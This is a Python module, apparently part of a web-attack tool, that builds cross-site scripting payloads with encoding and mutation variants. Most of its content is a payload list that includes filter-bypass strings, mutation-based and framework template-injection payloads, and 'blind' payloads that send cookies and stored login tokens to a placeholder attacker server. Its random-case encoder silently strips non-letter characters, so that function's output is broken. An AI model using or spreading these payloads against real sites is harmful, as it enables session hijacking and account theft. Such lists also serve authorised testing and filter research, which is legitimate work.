#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Payload Engine
Generates context-aware XSS payloads with encoding variations
"""

import random
import html
import base64
from typing import List, Dict

class PayloadEngine:
    """Advanced XSS Payload Generation Engine"""

    def __init__(self):
        self.payloads = self._load_payloads()
        self.encoders = self._load_encoders()

    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load comprehensive payload database"""
        return {
            'basic': [
                "<script>alert('XSS')</script>",
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "'-alert(1)-'",
                "'-alert(1)//",
                "\"><img src=x onerror=alert('XSS')>",
                "'><img src=x onerror=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
            ],
            'advanced': [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<img src=x onerror=alert&#40;'XSS'&#41;>",
                "<svg/onload=alert('XSS')>",
                "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
                "javascript://%0aalert('XSS')",
                "';alert(String.fromCharCode(88,83,83))//",
                "'-alert(1){%0d%0a%09)-->",
                "\"><script>alert(String.fromCharCode(88,83,83))</script>",
                "<marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<select onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')></video>",
                "<audio src=x onerror=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<div onmouseover=alert('XSS')>hover me</div>",
                "<object data=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
            ],
            'polyglots': [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
                "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29);>",
                "\"><img src=x onerror=window['al'+'ert'](1)>",
                "'-confirm(1)-'",
                "'-confirm(1)//",
                "<svg/onload=window['al'+'ert'](1)>",
                "\"><svg/onload=window['al'+'ert'](document.domain)>",
            ],
            'dom': [
                "#<img src=x onerror=alert(1)>",
                "#javascript:alert(1)",
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "';alert(1);//",
                "\"><img src=x onerror=alert(1)>",
                "<img src=x onerror=alert(1)>",
                "eval(atob('YWxlcnQoMSk='))",
                "setTimeout('alert(1)',0)",
                "setInterval('alert(1)',0)",
                "Function('alert(1)')()",
                "constructor.constructor('alert(1)')()",
            ],
            'blind': [
                "<script src='http://YOUR-SERVER/?c='+document.cookie></script>",
                "<img src=x onerror=\"fetch('http://YOUR-SERVER/?c='+localStorage.getItem('token'))\">",
                "<script>new Image().src='http://YOUR-SERVER/?c='+document.cookie</script>",
                "<svg/onload=\"fetch('http://YOUR-SERVER/?c='+document.domain)\">",
            ],
            'waf_bypass': [
                "<img src=x onerror=al\u0065rt(1)>",
                "<img src=x onerror=top['al'+'ert'](1)>",
                "<svg/onload=self['al'+'ert'](1)>",
                "javascript:top['al'+'ert'](1)",
                "<img src=x onerror=top[8680439..toString(30)](1)>",
                "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "<img src=x onerror=eval(location.hash.slice(1))>#alert(1)",
                "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                "\"><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                "'-eval(String.fromCharCode(97,108,101,114,116,40,49,41))-'",
            ],
            'html5': [
                "<canvas onmousemove=alert(1)>",
                "<meter onmouseover=alert(1)>",
                "<progress onmouseover=alert(1) value=0 max=1>",
                "<datalist onfocus=alert(1) autofocus>",
                "<output onfocus=alert(1) autofocus>",
                "<menu onshow=alert(1)>",
                "<dialog open onfocus=alert(1) autofocus>",
                "<template onfocus=alert(1) tabindex=1 autofocus>",
                "<content onfocus=alert(1) tabindex=1 autofocus>",
                "<shadow onfocus=alert(1) tabindex=1 autofocus>",
                "<slot onfocus=alert(1) tabindex=1 autofocus>",
                "<element onfocus=alert(1) tabindex=1 autofocus>",
            ],
            'mutation': [
                "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
                "<style><img src=x onerror=alert(1)></style>",
                "<xmp><img src=x onerror=alert(1)></xmp>",
                "<iframe><img src=x onerror=alert(1)></iframe>",
                "<noembed><img src=x onerror=alert(1)></noembed>",
                "<noframes><img src=x onerror=alert(1)></noframes>",
                "<plaintext><img src=x onerror=alert(1)>",
                "<script><img src=x onerror=alert(1)></script>",
            ],
            'angular': [
                "{{constructor.constructor('alert(1)')()}}",
                "{{$on.constructor('alert(1)')()}}",
                "{{_=''.sub.call;_$=_.call.bind(_);$$=$_($_.call.bind($_,_.call));$$('alert(1)')()}}",
                "{{[].pop.constructor('alert(1)')()}}",
                "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
            ],
            'react': [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "\u003cimg src=x onerror=alert(1)\u003e",
            ],
            'vue': [
                "{{constructor.constructor('alert(1)')()}}",
                "{{_c.constructor('alert(1)')()}}",
                "{{this.constructor.constructor('alert(1)')()}}",
            ],
        }

    def _load_encoders(self) -> Dict[str, callable]:
        """Load encoding functions"""
        return {
            'url': lambda x: x.replace(' ', '%20').replace("'", '%27').replace('"', '%22'),
            'double_url': lambda x: x.replace('%', '%25'),
            'html_entities': lambda x: ''.join(f'&#{ord(c)};' for c in x),
            'hex_entities': lambda x: ''.join(f'&#x{ord(c):x};' for c in x),
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'null_bytes': lambda x: x.replace('<', '%00<'),
            'case_random': self._random_case,
        }

    def _random_case(self, payload: str) -> str:
        """Randomize case of letters"""
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() 
                      for c in payload if c.isalpha()) or payload

    def get_payloads_for_context(self, context: str) -> List[str]:
        """Get payloads appropriate for context"""
        all_payloads = []

        all_payloads.extend(self.payloads['basic'])
        all_payloads.extend(self.payloads['advanced'])
        all_payloads.extend(self.payloads['polyglots'])

        if context == 'dom':
            all_payloads.extend(self.payloads['dom'])
        elif context == 'blind':
            all_payloads.extend(self.payloads['blind'])
        elif context == 'waf':
            all_payloads.extend(self.payloads['waf_bypass'])
        elif context == 'html5':
            all_payloads.extend(self.payloads['html5'])
        elif context == 'mutation':
            all_payloads.extend(self.payloads['mutation'])
        elif context == 'framework':
            all_payloads.extend(self.payloads['angular'])
            all_payloads.extend(self.payloads['react'])
            all_payloads.extend(self.payloads['vue'])

        return list(set(all_payloads))

    def encode_payload(self, payload: str, encoding: str = 'all') -> List[str]:
        """Generate encoded variations of payload"""
        if encoding == 'all':
            encoded = [payload]
            for name, encoder in self.encoders.items():
                try:
                    encoded.append(encoder(payload))
                except:
                    continue
            return encoded
        elif encoding in self.encoders:
            return [self.encoders[encoding](payload)]
        return [payload]

    def mutate_payload(self, payload: str) -> List[str]:
        """Apply various mutations to payload"""
        mutations = [payload]

        mutations.append(payload.replace(' ', '/**/'))
        mutations.append(payload.replace(' ', '%09'))
        mutations.append(payload.replace(' ', '%0a'))
        mutations.append(payload.replace(' ', '%0d'))
        mutations.append(payload.replace("'", '"'))
        mutations.append(payload.replace('"', "'"))
        mutations.append(payload.replace("'", '`'))
        mutations.append(payload.replace('javascript:', 'jaVascript:'))
        mutations.append(payload.replace('javascript:', 'javascript%3a'))

        return list(set(mutations))
